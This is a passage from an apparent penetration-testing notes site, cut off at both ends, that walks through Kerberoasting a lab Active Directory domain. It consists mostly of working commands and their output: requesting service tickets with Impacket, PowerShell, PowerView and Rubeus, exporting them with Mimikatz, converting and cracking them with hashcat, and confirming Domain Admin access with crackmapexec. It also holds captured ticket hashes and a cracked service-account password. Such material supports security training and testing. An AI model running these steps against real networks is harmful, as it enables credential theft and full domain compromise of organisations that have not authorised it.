\n\n\n\n$krb5tgs$23$*sqldev$legalcorp.local$legalcorp.local/sqldev*$4ce5b71188b357b26032321529762c8a$1bdc5810b36c8e485ba08fcb7ab273f778115cd17734ec65be71f5b4bea4c0e63fa7bb454fdd5481e32f002abff9d1c7827fe3a75275f432ebb628a471d3be45898e7cb336404e8041d252d9e1ebef4dd3d249c4ad3f64efaafd06bd024678d4e6bdf582e59c5660fcf0b4b8db4e549cb0409ebfbd2d0c15f0693b4a8ddcab243010f3877d9542c790d2b795f5b9efbcfd2dd7504e7be5c2f6fb33ee36f3fe001618b971fc1a8331a1ec7b420dfe13f67ca7eb53a40b0c8b558f2213304135ad1c59969b3d97e652f55e6a73e262544fe581ddb71da060419b2f600e08dbcc21b57355ce47ca548a99e49dd68838c77a715083d6c26612d6c60d72e4d421bf39615c1f9cdb7659a865eecca9d9d0faf2b77e213771f1d923094ecab2246e9dd6e736f83b21ee6b352152f0b3bbfea024c3e4e5055e714945fe3412b51d3205104ba197037d44a0eb73e543eb719f12fd78033955df6f7ebead5854ded3c8ab76b412877a5be2e7c9412c25cf1dcb76d854809c52ef32841269064661931dca3c2ba8565702428375f754c7f2cada7c2b34bbe191d60d07111f303deb7be100c34c1c2c504e0016e085d49a70385b27d0341412de774018958652d80577409bff654c00ece80b7975b7b697366f8ae619888be243f0e3237b3bc2baca237fb96719d9bc1db2a59495e9d069b14e33815cafe8a8a794b88fb250ea24f4aa82e896b7a68ba3203735ec4bca937bceac61d31316a43a0f1c2ae3f48cbcbf294391378ffd872cf3721fe1b427db0ec33fd9e4dfe39c7cbed5d70b7960758a2d89668e7e855c3c493def6aba26e2846b98f65b798b3498af7f232024c119305292a31ae121a3472b0b2fcaa3062c3d93af234c9e24d605f155d8e14ac11bb8f810df400604c3788e3819b44e701f842c52ab302c7846d6dcb1c75b14e2c9fdc68a5deb5ce45ec9db7318a80de8463e18411425b43c7950475fb803ef5a56b3bb9c062fe90ad94c55cdde8ec06b2e5d7c64538f9c0c598b7f4c3810ddb574f689563db9591da93c879f5f7035f4ff5a6498ead489fa7b8b1a424cc37f8e86c7de54bdad6544ccd6163e650a5043819528f38d64409cb1cfa0aeb692bdf3a130c9717429a49fff757c713ec2901d674f80269454e390ea27b8230dec7fffb032217955984274324a3fb423fb05d3461f17200dbef0a51780d31ef4586b51f130c864db79796d75632e539f1118318db92ab54b61fc468eb626beaa7869661bf11f0c3a501512a94904c596652f6457a240a3f8ff2d8171465079492e93659ec80e2027d6b1865f436a443b4c16b5771059ba9b2c91e871ad7baa5355d5e580a8ef05bac02cf135813b42a1e172f873bb4ded2e95faa6990ce92724bcfea6661b592539cd9791833a83e6116cb0ea4b6db3b161ac7e7b425d0c249b3538515ccfb3a993affbd2e9d247f317b326ebca20fe6b7324ffe311f225900e14c62eb34d9654bb81990aa1bf626dec7e26ee2379ab2f30d14b8a98729be261a5977fefdcaaa3139d4b82a056322913e7114bc133a6fc9cd74b96d4d6a2\n</code></pre></p> <p>To facilitate offline cracking, it is always good to use the <code>-outputfile</code> flag to write the TGS tickets to a file</p> <pre><code>GetUserSPNs.py -dc-ip 172.16.5.5 legalcorp.local/forend -request-user sqldev -outputfile sqldev_tgs\n\nImpacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation\n\nPassword:\nServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation \n---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------\nMSSQLSvc/DEV-PRE-SQL.legalcorp.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=LEGALCORP,DC=LOCAL  2022-02-15 17:13:31.639334  &lt;never&gt;  \n</code></pre> <pre><code>secops@kali[/kali]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt \n\nhashcat (v6.1.1) starting...\n\n&lt;SNIP&gt;\n</code></pre> <p>We can confirm our access and see that we indeed have Domain Admin rights. From here, we could perform post-exploitation and continue to enumerate the domain for other paths to compromise and other notable flaws and misconfigurations.</p> <pre><code>secops@kali[/kali]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:legalcorp.local) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] legalcorp.local\\sqldev:database! (Pwn3d!)\n</code></pre>","title":"Kerberoasting - Linux"},{"location":"active_directory/cooking_with_fire/kerberoasting_from_windows/","text":"Kerberoasting - Semi Manual method <p>Enumerating SPNs with setspn.exe</p> <pre><code>C:\\xyz&gt; setspn.exe -Q */*\n\nChecking domain DC=LEGALCORP,DC=LOCAL\nCN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=LEGALCORP,DC=LOCAL\n        exchangeAB/ACADEMY-EA-DC01\n        exchangeAB/ACADEMY-EA-DC01.legalcorp.local\n        TERMSRV/ACADEMY-EA-DC01\n        TERMSRV/ACADEMY-EA-DC01.legalcorp.local\n        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.legalcorp.local\n        ldap/ACADEMY-EA-DC01.legalcorp.local/ForestDnsZones.legalcorp.local\n        ldap/ACADEMY-EA-DC01.legalcorp.local/DomainDnsZones.legalcorp.local\n\n&lt;SNIP&gt;\n\nCN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=LEGALCORP,DC=LOCAL\n        backupjob/veam001.legalcorp.local\nCN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=LEGALCORP,DC=LOCAL\n        sts/legalcorp.local\n\n&lt;SNIP&gt;\n\nCN=sqlprod,OU=Service Accounts,OU=Corp,DC=LEGALCORP,DC=LOCAL\n        MSSQLSvc/SPSJDB.legalcorp.local:1433\nCN=sqlqa,OU=Service Accounts,OU=Corp,DC=LEGALCORP,DC=LOCAL\n        MSSQLSvc/SQL-CL01-01legalcorp.local:49351\nCN=sqldev,OU=Service Accounts,OU=Corp,DC=LEGALCORP,DC=LOCAL\n        MSSQLSvc/DEV-PRE-SQL.legalcorp.local:1433\nCN=adfs,OU=Service Accounts,OU=Corp,DC=LEGALCORP,DC=LOCAL\n        adfsconnect/azure01.legalcorp.local\n\nExisting SPN found!\n</code></pre> <p>Focus on user accounts and ignore the computer accounts returned by the tool. Next, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using <code>Mimikatz</code>.</p> <p>Targeting a Single User <pre><code>PS C:\\xyz&gt; Add-Type -AssemblyName System.IdentityModel\nPS C:\\xyz&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.legalcorp.local:1433\"\n\nId                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2\nSecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}\nValidFrom            : 2/24/2022 11:36:22 PM\nValidTo              : 2/25/2022 8:55:25 AM\nServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.legalcorp.local:1433\nSecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey\n</code></pre></p> <p>Break down of the commands above to see what we are doing (which is essentially what is used by Rubeus when using the default Kerberoasting method):</p> <ul> <li>The Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object</li> <li>The <code>-AssemblyName</code> parameter allows us to specify an assembly that contains types that we are interested in using</li> <li> System.IdentityModel is a namespace that contains different classes for building security token services</li> <li>We'll then use the New-Object cmdlet to create an instance of a .NET Framework object</li> <li>We'll use the System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session</li> </ul> <p>We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.</p> <pre><code>PS C:\\xyz&gt; setspn.exe -T legalcorp.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }\n\nId                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-3\nSecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}\nValidFrom            : 2/24/2022 11:56:18 PM\nValidTo              : 2/25/2022 8:55:25 AM\nServicePrincipalName : exchangeAB/ACADEMY-EA-DC01\nSecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey\n\nId                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-4\nSecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}\nValidFrom            : 2/24/2022 11:56:18 PM\nValidTo              : 2/24/2022 11:58:18 PM\nServicePrincipalName : kadmin/changepw\nSecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey\n\nId                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-5\nSecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}\nValidFrom            : 2/24/2022 11:56:18 PM\nValidTo              : 2/25/2022 8:55:25 AM\nServicePrincipalName : WSMAN/ACADEMY-EA-MS01\nSecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey\n\n&lt;SNIP&gt;\n</code></pre> <p>The above command combines the previous command with <code>setspn.exe</code> to request tickets for all accounts with SPNs set.</p> <p>Extracting Tickets from Memory with Mimikatz <pre><code>Using 'mimikatz.log' for logfile : OK\n\nmimikatz # base64 /out:true\nisBase64InterceptInput  is false\nisBase64InterceptOutput is true\n\nmimikatz # kerberos::list /export  \n\n&lt;SNIP&gt;\n\n[00000002] - 0x00000017 - rc4_hmac_nt      \n   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM\n   Server Name       : MSSQLSvc/DEV-PRE-SQL.legalcorp.local:1433 @ legalcorp.local\n   Client Name       : user @ legalcorp.local\n   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; \n====================\nBase64 of file : 2-40a10000-user@MSSQLSvc~DEV-PRE-SQL.legalcorp.local~1433-legalcorp.local.kirbi\n====================\n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\nZWZyZWlnaHQubG9jYWw6MTQzMw==\n====================\n\n   * Saved to file     : 2-40a10000-user@MSSQLSvc~DEV-PRE-SQL.legalcorp.local~1433-legalcorp.local.kirbi\n\n&lt;SNIP&gt;\n</code></pre></p> <p>If we do not specify the <code>base64 /out:true</code> command, Mimikatz will extract the tickets and write them to <code>.kirbi</code> files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. Let's take the base64 blob retrieved above and prepare it for cracking.</p> <p>Preparing the Base64 Blob for Cracking <pre><code>secops@kali[/kali]$ echo \"&lt;base64 blob&gt;\" |  tr -d \\\\n \n\n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\n</code></pre></p> <p>Placing the Output into a File as .kirbi <pre><code>secops@kali[/kali]$ cat encoded_file | base64 -d &gt; sqldev.kirbi\n</code></pre></p> <p>Next, we can use this version of the <code>kirbi2john.py</code> tool to extract the Kerberos ticket from the TGS file.</p> <pre><code>secops@kali[/kali]$ python2.7 kirbi2john.py sqldev.kirbi\n</code></pre> <p>This will create a file called crack_file. We then must modify the file a bit to be able to use Hashcat against the hash.</p> <pre><code>secops@kali[/kali]$ sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; sqldev_tgs_hashcat\n</code></pre> <p>Now we can check and confirm that we have a hash that can be fed to Hashcat. <pre><code>secops@kali[/kali]$ cat sqldev_tgs_hashcat \n\n$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20cdfb0ef144055356a7296e33b440754be7f87754ac2e4858348e2aebb7270b2d345047f880e17acc07e27a8f752c372bc83a62d54208d12288893d32afd210191dd3b2c56797bd1a72e35a73a7820be51fbf277b83d8181fff5a05cf21481a7b462ceb01c3761c50952689ed1099827c17c2934131db71bc5142c589cd70ed2ebf57dca3f6226f3b21849529355414433210b8d7bd76fec4eb68a45deebc3e7cc931ed8769328536769123f5040d6771915cdbc6c90164669fac72d23a631fef25804b5c8ec39680a4cc2959929edce34bbee6aff135bcbbb26a41a4b4e88b936896d4662ac849f56d7d68071be139cf4dfaf66497015297f9b44cdaef096c8d00255ec3e62f7105d905d0b2f39cef83db4d812718f95e8c99129f3207b386b4c32f7d57befd411e19c218148d19028eb0103d6be99ae23a454f6f3b0339d00d27879f342598937596cadad068ac3d815952a053f87d87b2584784b9d83050eea9a7c6474cde26c90f4a3546076a40ed374d004c465f654623499ca14e9c11538012cf00dee315e2ed444293822502d7f685022e61f3568e1db25b5cfe5a89b33878b6e3db05e9d91ad63820fcb7d0449e66add13f1efceddda95339db3dc919f1caff9690e54b3e4f9a8cf6998a9f9bf55c7a2ed2c87382e9da60f7ca3c22e08cc359f3ef6f4603a5af2fc28303bf3602ab9bc52026e58c27fb247fd4210f45244fd71484685b837fe9573a53964d54acfde7f963028764e99bea7b77139cb651328e862e43d894638288eace99b6d4f8b6684150db9adc43254143b77f32ebe6fbe309dde3b78305fdf0fe60505f9000b89c67c75ef6dd425e04fbe3a5ebf2d78a11a392d815a29ef48d9457fb6c780eb4cc07dfa68c2e97054788952f5ad92ca8d062e4a68967860302fd9630174af832e599bb5fca9cf341d7a1176868d9073796dffbd48efe99b222f4274e93066de646b3c60d1dd94072dd121dd0706024d11738a75ebeb5b7865a5505220d0f03aea6d359a17f3c5b6424989b31b6e52d1c558393aa34e81204fb107374a8884dcb16f6c59a76a0022004fd921734b8719e8694ba0d7f87eb46f5607af4eb1c681b6b5140dbc94a9ea7f5db6ae4c71fbc1024a25b77ac00bdc549d66373d390643be8f1007930a4124e99d4fcb6177dbd5669fb06170d3b8a75db9928164b55e454d08e77f917b1dd2e648d9c7eb0cb2b8ca0eff8a44d1ea5fdd67e01da79047a4a1406f761f5e3b6944cebed45379ea14e7a027c843fa405c07c8385a2102f07967a7cb4883f44ee72d4aa7a38b2701e77374016a01193f5b178e34f4cf2d8eadf651e162569eb421c74e8d5e0cc1a9fab58a4b9b63babb09efc3427e1667f9c7731bcabe3645986040a7306924df5e6e68655e7b0e2e88e7ce0281e0f554de82d9de6c4d9c8d2a36fce65bbb337a415030ce1d03c00fd9783afb5df0ee8fbabfa358521ad845e6d07fde7d34f2311ebae6e6a119d60d899467a66f997c273d2df73350f2d6c5438e71a057feeab\n</code></pre></p> <p>Cracking the Hash with Hashcat <pre><code>secops@kali[/kali]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt \n\n&lt;SNIP&gt;\n\n$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20cdfb0ef144055356a7296e33b440754be7f87754ac2e4858348e2aebb7270b2d345047f880e17acc07e27a8f752c372bc83a62d54208d12288893d32afd210191dd3b2c56797bd1a72e35a73a7820be51fbf277b83d8181fff5a05cf21481a7b462ceb01c3761c50952689ed1099827c17c2934131db71bc5142c589cd70ed2ebf57dca3f6226f3b21849529355414433210b8d7bd76fec4eb68a45deebc3e7cc931ed8769328536769123f5040d6771915cdbc6c90164669fac72d23a631fef25804b5c8ec39680a4cc2959929edce34bbee6aff135bcbbb26a41a4b4e88b936896d4662ac849f56d7d68071be139cf4dfaf66497015297f9b44cdaef096c8d00255ec3e62f7105d905d0b2f39cef83db4d812718f95e8c99129f3207b386b4c32f7d57befd411e19c218148d19028eb0103d6be99ae23a454f6f3b0339d00d27879f342598937596cadad068ac3d815952a053f87d87b2584784b9d83050eea9a7c6474cde26c90f4a3546076a40ed374d004c465f654623499ca14e9c11538012cf00dee315e2ed444293822502d7f685022e61f3568e1db25b5cfe5a89b33878b6e3db05e9d91ad63820fcb7d0449e66add13f1efceddda95339db3dc919f1caff9690e54b3e4f9a8cf6998a9f9bf55c7a2ed2c87382e9da60f7ca3c22e08cc359f3ef6f4603a5af2fc28303bf3602ab9bc52026e58c27fb247fd4210f45244fd71484685b837fe9573a53964d54acfde7f963028764e99bea7b77139cb651328e862e43d894638288eace99b6d4f8b6684150db9adc43254143b77f32ebe6fbe309dde3b78305fdf0fe60505f9000b89c67c75ef6dd425e04fbe3a5ebf2d78a11a392d815a29ef48d9457fb6c780eb4cc07dfa68c2e97054788952f5ad92ca8d062e4a68967860302fd9630174af832e599bb5fca9cf341d7a1176868d9073796dffbd48efe99b222f4274e93066de646b3c60d1dd94072dd121dd0706024d11738a75ebeb5b7865a5505220d0f03aea6d359a17f3c5b6424989b31b6e52d1c558393aa34e81204fb107374a8884dcb16f6c59a76a0022004fd921734b8719e8694ba0d7f87eb46f5607af4eb1c681b6b5140dbc94a9ea7f5db6ae4c71fbc1024a25b77ac00bdc549d66373d390643be8f1007930a4124e99d4fcb6177dbd5669fb06170d3b8a75db9928164b55e454d08e77f917b1dd2e648d9c7eb0cb2b8ca0eff8a44d1ea5fdd67e01da79047a4a1406f761f5e3b6944cebed45379ea14e7a027c843fa405c07c8385a2102f07967a7cb4883f44ee72d4aa7a38b2701e77374016a01193f5b178e34f4cf2d8eadf651e162569eb421c74e8d5e0cc1a9fab58a4b9b63babb09efc3427e1667f9c7731bcabe3645986040a7306924df5e6e68655e7b0e2e88e7ce0281e0f554de82d9de6c4d9c8d2a36fce65bbb337a415030ce1d03c00fd9783afb5df0ee8fbabfa358521ad845e6d07fde7d34f2311ebae6e6a119d60d899467a66f997c273d2df73350f2d6c5438e71a057feeab:database!\n\n&lt;SNIP&gt;\n</code></pre></p> <p>If we decide to skip the base64 output with Mimikatz and type <code>mimikatz # kerberos::list /export</code>, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run <code>kirbi2john.py</code> against them directly, skipping the base64 decoding step.</p>  Automated/Tool based route <p>Using PowerView to Extract TGS Tickets <pre><code>PS C:\\xyz&gt; Import-Module .\\PowerView.ps1\nPS C:\\xyz&gt; Get-DomainUser * -spn | select samaccountname\n\nsamaccountname\n--------------\nadfs\nbackupagent\nkrbtgt\nsqldev\nsqlprod\nsqlqa\nsolarwindsmonitor\n</code></pre></p> <p>Example: Target a specific user and retrieve the TGS ticket in Hashcat format. <pre><code>PS C:\\xyz&gt; Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\n\n&lt;SNIP&gt;\n</code></pre></p> <p>Finally, we can export all tickets to a CSV file for offline processing. <pre><code>PS C:\\xyz&gt; Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\lcorp_tgs.csv -NoTypeInformation\n</code></pre></p> <pre><code>PS C:\\xyz&gt; cat .\\lcorp_tgs.csv\n\n\"SamAccountName\",\"DistinguishedName\",\"ServicePrincipalName\",\"TicketByteHexStream\",\"Hash\"\n\"adfs\",\"CN=adfs,OU=Service Accounts,OU=Corp,DC=LEGALCORP,DC=LOCAL\",\"adfsconnect/azure01.legalcorp.local\",,\"$krb5tgs$23$*adfs$legalcorp.local$adfsconnect/azure01.legalcorp.local*$59C086008BBE7EAE4E483506632F6EF8$622D9E1DBCB1FF2183482478B5559905E0CCBDEA2B52A5D9F510048481F2A3A4D2CC47345283A9E71D65E1573DCF6F2380A6FFF470722B5DEE704C51FF3A3C2CDB2945CA56F7763E117F04F26CA71EEACED25730FDCB06297ED4076C9CE1A1DBFE961DCE13C2D6455339D0D90983895D882CFA21656E41C3DDDC4951D1031EC8173BEEF9532337135A4CF70AE08F0FB34B6C1E3104F35D9B84E7DF7AC72F514BE2B346954C7F8C0748E46A28CCE765AF31628D3522A1E90FA187A124CA9D5F911318752082FF525B0BE1401FBA745E1\n\n&lt;SNIP&gt;\n</code></pre>  Using Rubeus <pre><code>PS C:\\xyz&gt; .\\Rubeus.exe\n\n&lt;SNIP&gt;\n\nRoasting:\n\n    Perform Kerberoasting:\n        Rubeus.exe kerberoast [[/spn:\"blah/blah\"] | [/spns:C:\\temp\\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps] [/nowrap]\n\n    Perform Kerberoasting, outputting hashes to a file:\n        Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:\"blah/blah\"] | [/spns:C:\\temp\\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps]\n\n&lt;SNIP&gt;\n</code></pre> <p>We can first use Rubeus to gather some stats. From the output below, we can see that there are nine Keberoastable users, seven of which support RC4 encryption for ticket requests and two of which support AES 128/256. We also see that all nine accounts had their password set this year (2022 at the time of writing). If we saw any SPN accounts with their passwords set 5 or more years ago, they could be promising targets as they could have a weak password that was set and never changed when the organization was less mature.</p> <pre><code>PS C:\\xyz&gt; .\\Rubeus.exe kerberoast /stats\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   